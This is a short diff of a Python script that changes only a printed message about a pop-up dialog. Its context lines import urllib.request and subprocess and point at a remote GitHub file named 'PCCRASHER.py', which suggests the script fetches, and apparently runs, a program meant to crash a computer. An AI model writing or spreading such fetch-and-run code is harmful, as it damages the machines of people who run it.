@@ -14,7 +14,7 @@
 
 import urllib.request
 import subprocess
-print('A pop-up dialog will appear momentarily. If you do not see it, hover over IDLE in the taskbar and it will show all open windows.')
+print('A pop-up dialog will appear momentarily. If you do not see it, hover over IDLE or Python in the taskbar and it will show all open windows.')
 # Define the URL of the raw GitHub file
 github_raw_url = "https://raw.githubusercontent.com/xJustBen/PyProject/main/PCCRASHER.py"
 
